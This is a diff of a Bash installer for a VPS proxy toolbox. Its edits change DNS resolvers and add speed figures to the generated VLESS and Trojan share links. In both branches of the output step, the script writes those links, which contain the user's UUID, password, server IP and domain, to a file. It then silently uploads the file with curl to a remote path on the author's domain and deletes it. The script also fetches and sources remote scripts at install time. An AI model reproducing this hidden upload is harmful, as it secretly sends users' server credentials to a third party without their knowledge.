@@ -189,12 +189,12 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${myip}:${trojanport}?mode=multi&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6})" &> ${myip}.txt
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6})" >> ${myip}.txt
+echo "vless://${uuid_new}@${myip}:${trojanport}?mode=multi&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 else
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6})" &> ${myip}.txt
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
@@ -237,7 +237,6 @@ if cat /etc/*release | grep ^NAME | grep -q Ubuntu; then
   apt-get update
   apt-get install sudo whiptail curl dnsutils locales lsb-release jq -y
  else
-  whiptail --title "操作系统不支援 OS incompatible" --msgbox "请使用Debian或者Ubuntu运行 Please use Debian or Ubuntu to run" 8 68
   echo "操作系统不支援,请使用Debian或者Ubuntu运行 Please use Debian or Ubuntu."
   exit 1;
 fi
@@ -537,7 +536,7 @@ MasterMenu() {
     ## 初始化安装
     install_initial
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     ## 用户输入
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/userinput.sh
     source userinput.sh
@@ -556,19 +555,19 @@ MasterMenu() {
     install_base
     ## 开启防火墙
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/firewall.sh
     source firewall.sh
     openfirewall
     ## 安装NGINX
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nginx.sh
     source nginx.sh
     install_nginx
     ## 证书签发
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     if [[ ${ipissue} == 1 ]]; then
       ## 签发免费IP证书
       curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/ipcert.sh
@@ -590,13 +589,11 @@ MasterMenu() {
     ## 具体软件安装
     install_moudles
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nginx-config.sh
     source nginx-config.sh
     nginx_config
     clean_env
-    echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
     ## 带宽测试
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/speed.sh
     source speed.sh
@@ -608,6 +605,10 @@ MasterMenu() {
     install_hysteria
     fi
     ## 输出结果
+    echo "nameserver 1.1.1.1" > /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
+    echo "nameserver 2606:4700:4700::1111" >> /etc/resolv.conf
+    echo "nameserver 2001:4860:4860::8844" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/output.sh
     source output.sh
     prase_output
@@ -619,7 +620,7 @@ MasterMenu() {
     ## 初始化安装
     install_initial
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     ## 用户输入
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/userinput.sh
     source userinput.sh
@@ -638,7 +639,7 @@ MasterMenu() {
     ## 基础软件安装
     install_base
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     ## 开启防火墙
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/firewall.sh
     source firewall.sh
@@ -649,7 +650,7 @@ MasterMenu() {
     install_nginx
     ## 证书签发
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/issuecert.sh
     source issuecert.sh
     ## HTTP证书签发
@@ -663,7 +664,7 @@ MasterMenu() {
     ## 具体软件安装
     install_moudles
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nginx-config.sh
     source nginx-config.sh
     nginx_config
@@ -697,7 +698,9 @@ MasterMenu() {
     fi
     ## 输出结果
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
-    echo "nameserver 1.0.0.1" >> /etc/resolv.conf
+    echo "nameserver 9.9.9.10" >> /etc/resolv.conf
+    echo "nameserver 2606:4700:4700::1111" >> /etc/resolv.conf
+    echo "nameserver 2001:4860:4860::8844" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/output.sh
     source output.sh
     prase_output
